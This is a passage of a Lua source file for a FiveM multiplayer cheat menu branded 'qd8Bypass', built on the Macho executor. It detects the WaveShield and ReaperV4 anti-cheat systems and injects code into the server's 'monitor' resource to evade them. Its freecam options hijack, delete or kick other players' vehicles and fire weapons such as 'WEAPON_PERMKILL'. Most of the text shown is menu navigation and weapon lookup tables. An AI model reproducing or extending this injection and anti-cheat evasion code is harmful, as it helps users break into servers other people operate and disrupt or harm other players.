
---@diagnostic disable: undefined-global
local qd8 = {}
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local WeaponsLabels = { [GetHashKey('weapon_unarmed')] = 'Fists', [GetHashKey('weapon_knife')] = 'Knife', [GetHashKey('weapon_nightstick')] = 'Nightstick', [GetHashKey('weapon_hammer')] = 'Hammer', [GetHashKey('weapon_bat')] = 'Baseball Bat', [GetHashKey('weapon_golfclub')] = 'Golf Club', [GetHashKey('weapon_crowbar')] = 'Crowbar', [GetHashKey('weapon_pistol')] = 'Pistol', [GetHashKey('weapon_pistol_mk2')] = 'Pistol Mk II', [GetHashKey('weapon_snspistol_mk2')] = 'SNS Pistol Mk II', [GetHashKey('weapon_ceramicpistol')] = 'Ceramic Pistol', [GetHashKey('weapon_revolver_mk2')] = 'Heavy Revolver Mk II', [GetHashKey('weapon_doubleaction')] = 'Double-Action Revolver', [GetHashKey('weapon_gadgetpistol')] = 'Gadget Pistol', [GetHashKey('weapon_pistolxm3')] = 'WM 29 Pistol', [GetHashKey('weapon_combatpistol')] = 'Combat Pistol', [GetHashKey('weapon_appistol')] = 'AP Pistol', [GetHashKey('weapon_pistol50')] = 'Pistol .50', [GetHashKey('weapon_microsmg')] = 'Micro SMG', [GetHashKey('weapon_smg')] = 'SMG', [GetHashKey('weapon_assaultsmg')] = 'Assault SMG', [GetHashKey('weapon_assaultrifle')] = 'Assault Rifle', [GetHashKey('weapon_assaultrifle_mk2')] = 'Assault Rifle Mk II', [GetHashKey('weapon_specialcarbine_mk2')] = 'Special Carbine Mk II', [GetHashKey('weapon_bullpuprifle_mk2')] = 'Bullpup Rifle Mk II', [GetHashKey('weapon_militaryrifle')] = 'Military Rifle', [GetHashKey('weapon_tacticalrifle')] = 'Service Carbine', [GetHashKey('weapon_battlerifle')] = 'Battle Rifle', [GetHashKey('weapon_carbinerifle')] = 'Carbine Rifle', [GetHashKey('weapon_advancedrifle')] = 'Advanced Rifle', [GetHashKey('weapon_mg')] = 'MG', [GetHashKey('weapon_combatmg')] = 'Combat MG', [GetHashKey('weapon_pumpshotgun')] = 'Pump Shotgun', [GetHashKey('weapon_sawnoffshotgun')] = 'Sawed-Off Shotgun', [GetHashKey('weapon_assaultshotgun')] = 'Assault Shotgun', [GetHashKey('weapon_bullpupshotgun')] = 'Bullpup Shotgun', [GetHashKey('weapon_hackingdevice')] = 'Hacking Device', [GetHashKey('weapon_stungun')] = 'Stun Gun', [GetHashKey('weapon_stungun_mp')] = 'Stun Gun MP', [GetHashKey('weapon_sniperrifle')] = 'Sniper Rifle', [GetHashKey('weapon_heavysniper')] = 'Heavy Sniper', [GetHashKey('weapon_grenadelauncher')] = 'Grenade Launcher', [GetHashKey('weapon_rpg')] = 'RPG', [GetHashKey('weapon_minigun')] = 'Minigun', [GetHashKey('weapon_grenade')] = 'Grenade', [GetHashKey('weapon_stickybomb')] = 'Sticky Bomb', [GetHashKey('weapon_smokegrenade')] = 'Smoke Grenade', [GetHashKey('weapon_bzgas')] = 'BZ Gas', [GetHashKey('weapon_molotov')] = 'Molotov Cocktail', [GetHashKey('weapon_fireextinguisher')] = 'Fire Extinguisher', [GetHashKey('weapon_petrolcan')] = 'Jerry Can', [GetHashKey('weapon_ball')] = 'Baseball', [GetHashKey('weapon_snspistol')] = 'SNS Pistol', [GetHashKey('weapon_bottle')] = 'Broken Bottle', [GetHashKey('weapon_gusenberg')] = 'Gusenberg Sweeper', [GetHashKey('weapon_specialcarbine')] = 'Special Carbine', [GetHashKey('weapon_heavypistol')] = 'Heavy Pistol', [GetHashKey('weapon_bullpuprifle')] = 'Bullpup Rifle', [GetHashKey('weapon_dagger')] = 'Dagger', [GetHashKey('weapon_vintagepistol')] = 'Vintage Pistol', [GetHashKey('weapon_firework')] = 'Firework Launcher', [GetHashKey('weapon_musket')] = 'Musket', [GetHashKey('weapon_heavyshotgun')] = 'Heavy Shotgun', [GetHashKey('weapon_marksmanrifle')] = 'Marksman Rifle', [GetHashKey('weapon_hominglauncher')] = 'Homing Launcher', [GetHashKey('weapon_proxmine')] = 'Proximity Mines', [GetHashKey('weapon_snowball')] = 'Snowball', [GetHashKey('weapon_flaregun')] = 'Flare Gun', [GetHashKey('weapon_garbagebag')] = 'Garbage Bag', [GetHashKey('weapon_handcuffs')] = 'Handcuffs', [GetHashKey('weapon_combatpdw')] = 'Combat PDW', [GetHashKey('weapon_marksmanpistol')] = 'Marksman Pistol', [GetHashKey('weapon_knuckle')] = 'Knuckle Dusters', [GetHashKey('weapon_hatchet')] = 'Hatchet', [GetHashKey('weapon_railgun')] = 'Railgun', [GetHashKey('weapon_machinepistol')] = 'Machine Pistol', [GetHashKey('weapon_switchblade')] = 'Switchblade', [GetHashKey('weapon_revolver')] = 'Heavy Revolver', [GetHashKey('weapon_heavyrifle')] = 'Heavy Rifle', [GetHashKey('weapon_dbshotgun')] = 'Double Barrel Shotgun', [GetHashKey('weapon_compactrifle')] = 'Compact Rifle', [GetHashKey('weapon_battleaxe')] = 'Battle Axe', [GetHashKey('weapon_compactlauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_minismg')] = 'Mini SMG', [GetHashKey('weapon_pipebomb')] = 'Pipe Bomb', [GetHashKey('weapon_poolcue')] = 'Pool Cue', [GetHashKey('weapon_wrench')] = 'Wrench', [GetHashKey('weapon_autoshotgun')] = 'Sweeper Shotgun', [GetHashKey('weapon_bread')] = 'Piece of Bread', [GetHashKey('weapon_stone_hatchet')] = 'Stone Hatchet', [GetHashKey('weapon_rayminigun')] = 'Unholy Hellbringer', [GetHashKey('weapon_raycarbine')] = 'Widowmaker', [GetHashKey('weapon_compactgrenadelauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_smugglerpistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_raypistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_perico_pistol')] = 'Ceramic Pistol', [GetHashKey('weapon_carbinerifle_mk2')] = 'Carbine Rifle Mk II', [GetHashKey('weapon_combatmg_mk2')] = 'Combat MG Mk II', [GetHashKey('weapon_heavysniper_mk2')] = 'Heavy Sniper Mk II', [GetHashKey('weapon_marksmanrifle_mk2')] = 'Marksman Rifle Mk II', [GetHashKey('weapon_pumpshotgun_mk2')] = 'Pump Shotgun Mk II', [GetHashKey('weapon_smg_mk2')] = 'SMG Mk II', [GetHashKey('weapon_raycarbine_mk2')] = 'Widowmaker Mk II', [GetHashKey('weapon_machete')] = 'Machete', [GetHashKey('weapon_flashlight')] = 'Flashlight', [GetHashKey('weapon_hazardousknife')] = 'Hazardous Knife', [GetHashKey('weapon_navyrevolver')] = 'Navy Revolver', [GetHashKey('weapon_golfball')] = 'Golf Ball' }
local FirstInjectionPassed = false
local FreecamBypassReaperV4 = false
local FreecamInjected = false
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG", "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Kick from Vehicle", "Hijack Vehicle", "Delete Vehicle" }
local FreecamHoveredIndex = 1
local IsFalling = false
local NoCollision = false
local DeletePrevious = false
local TeleportInto = false
local MappedKeys = {
    [27] = "Escape", [112] = "F1", [113] = "F2",
    [114] = "F3", [115] = "F4", [116] = "F5",
    [117] = "F6", [118] = "F7", [119] = "F8",
    [120] = "F9", [121] = "F10", [122] = "F11",
    [123] = "F12", [192] = "`",
    [49] = "1", [50] = "2", [51] = "3",
    [52] = "4", [53] = "5", [54] = "6",
    [55] = "7", [56] = "8", [57] = "9",
    [48] = "0", [189] = "-", [187] = "=",
    [8] = "Backspace", [9] = "Tab", [81] = "Q",
    [87] = "W", [69] = "E", [82] = "R",
    [84] = "T", [89] = "Y", [85] = "U",
    [73] = "I", [79] = "O", [80] = "P",
    [219] = "[", [221] = "]", [220] = "\\",
    [20] = "CapsLock", [65] = "A", [83] = "S",
    [68] = "D", [70] = "F", [71] = "G",
    [72] = "H", [74] = "J", [75] = "K",
    [76] = "L", [186] = ";", [222] = "'",
    [13] = "Enter", [16] = "Shift", [90] = "Z",
    [88] = "X", [67] = "C", [86] = "V",
    [66] = "B", [78] = "N", [77] = "M",
    [188] = ",", [190] = ".", [191] = "/",
    [17] = "Control", [46] = "Delete", [33] = "PageUp",
    [34] = "PageDown", [35] = "End", [36] = "Home",
    [38] = "ArrowUp", [40] = "ArrowDown", [37] = "ArrowLeft", [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322,    -- Escape
    [112] = 288,   -- F1
    [113] = 289,   -- F2
    [114] = 170,   -- F3
    [115] = 167,   -- F4
    [116] = 166,   -- F5
    [117] = 167,   -- F6
    [118] = 168,   -- F7
    [119] = 169,   -- F8
    [120] = 56,    -- F9
    [121] = 57,    -- F10
    [122] = 344,   -- F11
    [123] = 345,   -- F12
    [192] = 243,   -- `
    [49] = 157,    -- 1
    [50] = 158,    -- 2
    [51] = 160,    -- 3
    [52] = 164,    -- 4
    [53] = 165,    -- 5
    [54] = 159,    -- 6
    [55] = 161,    -- 7
    [56] = 162,    -- 8
    [57] = 163,    -- 9
    [48] = 82,     -- 0
    [189] = 84,    -- -
    [187] = 83,    -- =
    [8] = 177,     -- Backspace
    [9] = 37,      -- Tab
    [81] = 44,     -- Q
    [87] = 32,     -- W
    [69] = 46,     -- E
    [82] = 45,     -- R
    [84] = 245,    -- T
    [89] = 246,    -- Y
    [85] = 303,    -- U
    [73] = 74,     -- I
    [79] = 199,    -- O
    [80] = 7,      -- P
    [219] = 39,    -- [
    [221] = 40,    -- ]
    [220] = 36,    -- \
    [20] = 137,    -- CapsLock
    [65] = 34,     -- A
    [83] = 33,     -- S
    [68] = 30,     -- D
    [70] = 49,     -- F
    [71] = 47,     -- G
    [72] = 74,     -- H
    [74] = 311,    -- J
    [75] = 311,    -- K
    [76] = 7,      -- L
    [186] = 81,    -- ;
    [222] = 82,    -- '
    [13] = 18,     -- Enter
    [16] = 21,     -- Shift
    [90] = 20,     -- Z
    [88] = 73,     -- X
    [67] = 26,     -- C
    [86] = 0,      -- V
    [66] = 29,     -- B
    [78] = 249,    -- N
    [77] = 244,    -- M
    [188] = 82,    -- ,
    [190] = 81,    -- .
    [191] = 83,    -- /
    [17] = 36,     -- Control
    [46] = 178,    -- Delete
    [33] = 10,     -- PageUp
    [34] = 11,     -- PageDown
    [35] = 213,    -- End
    [36] = 213,    -- Home
    [38] = 27,     -- ArrowUp
    [40] = 173,    -- ArrowDown
    [37] = 174,    -- ArrowLeft
    [39] = 175     -- ArrowRight
}


local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = {label = "Unarmed", hash = GetHashKey("weapon_unarmed")},
    ["weapon_knife"] = {label = "Knife", hash = GetHashKey("weapon_knife")},
    ["weapon_dagger"] = {label = "Dagger", hash = GetHashKey("weapon_dagger")},
    ["weapon_bat"] = {label = "Baseball Bat", hash = GetHashKey("weapon_bat")},
    ["weapon_bottle"] = {label = "Broken Bottle", hash = GetHashKey("weapon_bottle")},
    ["weapon_crowbar"] = {label = "Crowbar", hash = GetHashKey("weapon_crowbar")},
    ["weapon_golfclub"] = {label = "Golf Club", hash = GetHashKey("weapon_golfclub")},
    ["weapon_hammer"] = {label = "Hammer", hash = GetHashKey("weapon_hammer")},
    ["weapon_hatchet"] = {label = "Hatchet", hash = GetHashKey("weapon_hatchet")},
    ["weapon_machete"] = {label = "Machete", hash = GetHashKey("weapon_machete")},
    ["weapon_switchblade"] = {label = "Switchblade", hash = GetHashKey("weapon_switchblade")},
    ["weapon_nightstick"] = {label = "Nightstick", hash = GetHashKey("weapon_nightstick")},
    ["weapon_wrench"] = {label = "Wrench", hash = GetHashKey("weapon_wrench")},

    -- Handguns
    ["weapon_pistol"] = {label = "Pistol", hash = GetHashKey("weapon_pistol")},
    ["weapon_pistol_mk2"] = {label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2")},
    ["weapon_combatpistol"] = {label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol")},
    ["weapon_appistol"] = {label = "AP Pistol", hash = GetHashKey("weapon_appistol")},
    ["weapon_stungun"] = {label = "Taser", hash = GetHashKey("weapon_stungun")},
    ["weapon_pistol50"] = {label = "Pistol .50", hash = GetHashKey("weapon_pistol50")},
    ["weapon_snspistol"] = {label = "SNS Pistol", hash = GetHashKey("weapon_snspistol")},
    ["weapon_heavypistol"] = {label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol")},
    ["weapon_vintagepistol"] = {label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol")},
    ["weapon_flaregun"] = {label = "Flare Gun", hash = GetHashKey("weapon_flaregun")},

    -- SMGs
    ["weapon_microsmg"] = {label = "Micro SMG", hash = GetHashKey("weapon_microsmg")},
    ["weapon_smg"] = {label = "SMG", hash = GetHashKey("weapon_smg")},
    ["weapon_smg_mk2"] = {label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2")},
    ["weapon_assaultsmg"] = {label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg")},
    ["weapon_machinepistol"] = {label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol")},
    ["weapon_minismg"] = {label = "Mini SMG", hash = GetHashKey("weapon_minismg")},
    ["weapon_combatpdw"] = {label = "Combat PDW", hash = GetHashKey("weapon_combatpdw")},

    -- Rifles
    ["weapon_assaultrifle"] = {label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle")},
    ["weapon_assaultrifle_mk2"] = {label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2")},
    ["weapon_carbinerifle"] = {label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle")},
    ["weapon_carbinerifle_mk2"] = {label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2")},
    ["weapon_advancedrifle"] = {label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle")},
    ["weapon_specialcarbine"] = {label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine")},
    ["weapon_bullpuprifle"] = {label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle")},
    ["weapon_bullpuprifle_mk2"] = {label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2")},
    ["weapon_compactrifle"] = {label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle")},
    ["weapon_marksmanrifle"] = {label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle")},

    -- Shotguns
    ["weapon_pumpshotgun"] = {label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun")},
    ["weapon_pumpshotgun_mk2"] = {label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2")},
    ["weapon_sawnoffshotgun"] = {label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun")},
    ["weapon_assaultshotgun"] = {label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun")},
    ["weapon_bullpupshotgun"] = {label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun")},
    ["weapon_heavyshotgun"] = {label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun")},
    ["weapon_autoshotgun"] = {label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun")},

    -- Snipers
    ["weapon_sniperrifle"] = {label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle")},
    ["weapon_heavysniper"] = {label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper")},
    ["weapon_heavysniper_mk2"] = {label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2")},
    ["weapon_marksmanrifle_mk2"] = {label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2")},

    -- Explosives / Launchers
    ["weapon_grenade"] = {label = "Grenade", hash = GetHashKey("weapon_grenade")},
    ["weapon_stickybomb"] = {label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb")},
    ["weapon_molotov"] = {label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov")},
    ["weapon_pipebomb"] = {label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb")},
    ["weapon_proxmine"] = {label = "Proximity Mine", hash = GetHashKey("weapon_proxmine")},
    ["weapon_rpg"] = {label = "RPG", hash = GetHashKey("weapon_rpg")},
    ["weapon_grenadelauncher"] = {label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher")},
    ["weapon_hominglauncher"] = {label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher")},
    ["weapon_minigun"] = {label = "Minigun", hash = GetHashKey("weapon_minigun")},
    ["weapon_railgun"] = {label = "Railgun", hash = GetHashKey("weapon_railgun")},

    -- Throwables / Misc
    ["weapon_ball"] = {label = "Baseball", hash = GetHashKey("weapon_ball")},
    ["weapon_smokegrenade"] = {label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade")},
    ["weapon_flare"] = {label = "Flare", hash = GetHashKey("weapon_flare")},
    ["weapon_petrolcan"] = {label = "Jerry Can", hash = GetHashKey("weapon_petrolcan")},
    ["weapon_bzgas"] = {label = "BZ Gas", hash = GetHashKey("weapon_bzgas")}
}

local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or "Default" -- MachoInjectResource | MachoInjectResourceRaw
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource

---@param text string
function qd8:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    print(("^7[^5qd8^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function qd8:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function qd8:Notify(type, title, desc, duration)
    self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
end

function qd8:GetMenuPath()
    local path = { "Main Menu " }

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function qd8:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    local payload = {
        action = "updateElements",
        elements = elements,
        index = HoveredIndex - 1,
        path = self:GetMenuPath()
    }

    if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
    end

    self:SendMessage(payload)
end

function qd8:Initialize()
    DUI = MachoCreateDui("http://localhost:5173/index.html")
    if DUI then
        self:Debug("yellow", "Creating & Initializing DUI...")
        MachoShowDui(DUI)
        self:Debug("green", "DUI Created & Initialized Successfully!")
    else
        self:Debug("red", "Failed to Create DUI")
    end
end

function qd8:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
end

function qd8:ShowUI()
    IsVisible = true

    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "qd8Bypass"
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function qd8:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, OnConfirm, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onConfirm = OnConfirm,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    MachoSendDuiMessage(DUI, json.encode({ 
        action = "updateKeyboard", 
        visible = true, 
        title = Title, 
        value = CurrentKeyboardInput.buffer 
    }))

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    end

    Wait(250)
    qd8:HideUI(true)
    MenuOpenable = false
end


MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end
    
    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onConfirm then
            CurrentKeyboardInput.onConfirm(CurrentKeyboardInput.buffer)
        end

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    end

        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        end
        
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName then
                if CurrentKeyboardInput.buffer ~= keyName then
                    CurrentKeyboardInput.buffer = keyName
                end
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
                [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
                [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
                [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
                [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
                [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
                [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
                [0x5A] = "Z", [0xBD] = "-", [0xBB] = "=", [0xBC] = ",", [0xBE] = ".",
                [0xBA] = ";", [0xDE] = "'", [0xBF] = "/", [0xC0] = "`", [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if qd8:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        end
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

--- Scrolling function for normal navigation
---@param direction "Up"|"Down"
function qd8:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

--- Scrolling function for scrollable/slider tab navigation
---@param direction "Left"|"Right"
function qd8:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then

        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function qd8:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack, { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.type == "Server" then
            qd8:UpdateListMenu()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
